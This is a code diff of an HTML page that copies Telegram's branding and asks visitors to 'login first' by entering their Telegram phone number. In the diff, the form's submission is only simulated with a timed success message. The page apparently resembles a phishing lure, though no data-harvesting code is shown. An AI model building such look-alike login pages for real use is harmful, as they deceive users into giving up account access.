@@ -172,27 +172,27 @@
         <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394a.759.759 0 0 1-.6.295h-.006l.213-3.054 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.869 4.326-2.96-.924c-.643-.203-.658-.643.136-.953l11.566-4.458c.538-.196 1.006.128.832.941z"/>
       </svg>
     </div>
-    <h1>Enter Telegram number</h1>
-<p>To continue, please login first</p>
+    <h1>Enter Telegram Number</h1>
+  <p>To continue, please login first</p>
 
-<form id="phoneForm">
+  <form id="phoneForm">
+    <input type="tel"
+           id="phoneInput"
+           placeholder="Enter Telegram number"
+           required />
 
-  <label for="phoneInput">Telegram number</label>
-  <input type="tel" id="phoneInput"
-         placeholder="Enter Telegram number"
-         required />
+    <button type="submit" class="btn">Next</button>
 
-  <button type="submit" class="btn">Next</button>
+    <div class="disclaimer">
+      *Make sure the number entered is active.
+    </div>
+  </form>
 
-  <div class="disclaimer">
-    *Make sure the number entered is active to receive verification.
-  </div>
-</form>
+  <div class="status" id="statusMessage"></div>
+</div>
 
-<div class="status" id="statusMessage"></div>
-
-  <script>
-    const phoneForm = document.getElementById('phoneForm');
+<script>
+const phoneForm = document.getElementById('phoneForm');
 const phoneInput = document.getElementById('phoneInput');
 const statusMessage = document.getElementById('statusMessage');
 
@@ -207,10 +207,14 @@ phoneForm.addEventListener('submit', function(e) {
     return;
   }
 
-  statusMessage.textContent = "Processing...";
+  statusMessage.textContent = "⏳ Processing...";
   statusMessage.style.color = "#000";
 
-  // Lanjutkan proses sesuai sistem kamu
+  // Simulasi loading 2 detik
+  setTimeout(() => {
+    statusMessage.textContent = "✅ Number submitted successfully!";
+    statusMessage.style.color = "green";
+  }, 2000);
 });
   </script>
 </body>
